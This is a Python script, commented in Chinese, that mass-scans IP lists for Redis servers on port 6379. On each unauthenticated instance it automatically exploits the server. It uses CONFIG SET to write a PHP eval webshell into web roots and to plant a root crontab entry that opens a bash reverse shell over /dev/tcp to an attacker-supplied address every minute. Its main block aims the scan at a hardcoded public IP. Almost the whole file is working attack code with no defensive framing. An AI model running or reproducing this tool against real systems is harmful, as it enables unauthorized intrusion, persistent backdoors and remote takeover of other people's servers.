# -*- coding: utf-8 -*-
# @Time    : 14 2月 2025 10:11 下午
# @Author  : codervibe
# @File    : redisScan升级版.py
# @Project : pythonBasics
# 在check_redis_connect函数中添加操作系统判断逻辑

import concurrent.futures
import socket
import redis


def start_scan():
    """
    启动多线程扫描
    """
    # 从文件读取目标IP列表（示例路径）
    with open('ip_list.txt', 'r') as f:
        targets = [line.strip() for line in f]

    # 创建线程池（建议不超过50个线程）
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        # 提交扫描任务到线程池
        futures = [executor.submit(scan_port, ip, port=6379) for ip in targets]

        # 等待所有任务完成
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"\033[91m扫描异常: {str(e)}\033[0m")


def scan_port(ip, port=6379):
    """
    检查指定 IP 的 Redis 端口是否开放。

    :param port: 设置默认端口
    :param ip: 需要扫描的 IP 地址
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.3)  # 设置超时时间
    try:
        s.connect((ip, port))  # 尝试连接到 Redis 默认端口 6379
        print(f"\033[92m[+] {ip} 的 6379 端口上有 Redis 服务\033[0m")
        s.close()
        check_redis_connect(ip)
    except socket.error:
        print("\033[91m[-] 6379 端口已关闭\033[0m")
        return


def check_redis_connect(ip, port=6379):
    """
    检查指定 IP 的 Redis 是否存在未授权访问问题。

    :param port:
    :param ip: 需要检查的 IP 地址
    """
    try:
        r = redis.StrictRedis(host=ip, port=port, socket_timeout=3)
        info = r.info()

        # 新增操作系统判断
        os_type = info.get('os').strip().lower()  # 从Redis信息中获取操作系统类型
        print(f"\033[92m[+] 目标操作系统类型: {os_type}\033[0m")
        if info:
            print(f"\033[92m[+] {ip}  存在未授权访问（运行系统：{os_type.upper()}）\033[0m")
            print(f"\033[92m[+] {r.client_list()}\033[0m")
            # 根据操作系统调用不同攻击模块
            if os_type == 'linux' or 'linux' == os_type.split()[0]:
                exp_crontab(r)
                exp_webShell(r, os_type)

            if os_type == 'windows' or 'windows' == os_type.split()[0]:
                exp_webShell(r, os_type)

    except (redis.ConnectionError, redis.ResponseError) as e:
        print(f"\033[91m[-] 连接或操作失败: {str(e)}\033[0m")


def exp_webShell(redis_client, os_type):
    """
    根据操作系统写入webshell

    :param redis_client: Redis客户端对象
    :param os_type: 操作系统类型（windows/linux）
    """
    # 根据操作系统设置不同web根目录
    web_roots = {
        'linux': '/var/www/html',
        'windows': 'D:/phpstudy_pro/WWW'
    }
    # 如果无法识别操作系统则尝试通用路径
    target_dir = web_roots.get(os_type)
    try:
        # 设置Redis存储目录
        redis_client.config_set('dir', target_dir)
        # 设置Redis数据文件名
        redis_client.config_set('dbfilename', 'shell.php')
        # 写入Webshell内容到Redis
        redis_client.set('x', "<?php @eval($_POST['hihack']);?>")
        # 保存Redis配置
        redis_client.save()
        # 成功信息输出
        print(f"\033[92m[+] Webshell 写入成功至 {target_dir}\033[0m")
    except redis.ResponseError:
        # 错误处理，当路径配置失败时输出错误信息
        print(f"\033[91m[-] 路径 {target_dir} 配置失败，可能权限不足或路径不存在\033[0m")


def exp_crontab(redis_client):
    """
    Linux专用定时任务写入（Windows系统自动跳过）
    """
    your_ip = ''
    # 尝试设置Redis配置以修改Linux定时任务
    try:
        # 设置Redis保存目录
        redis_client.config_set('dir', '/var/spool/cron')
        # 设置Redis数据库文件名
        redis_client.config_set('dbfilename', 'root')
        # 设置定时任务命令，每分钟执行一次
        redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/' + your_ip + '/8888 0>&1\n\n')
        # 保存Redis配置
        redis_client.save()
        # 打印成功消息
        print(f"\033[92m[+] Linux定时任务已创建\033[0m")
    # 捕获Redis响应错误
    except redis.ResponseError as e:
        # 打印错误消息
        print(f"\033[91m定时任务创建失败: {str(e)}\033[0m")


if __name__ == '__main__':
    scan_port("123.58.224.8", 47241)
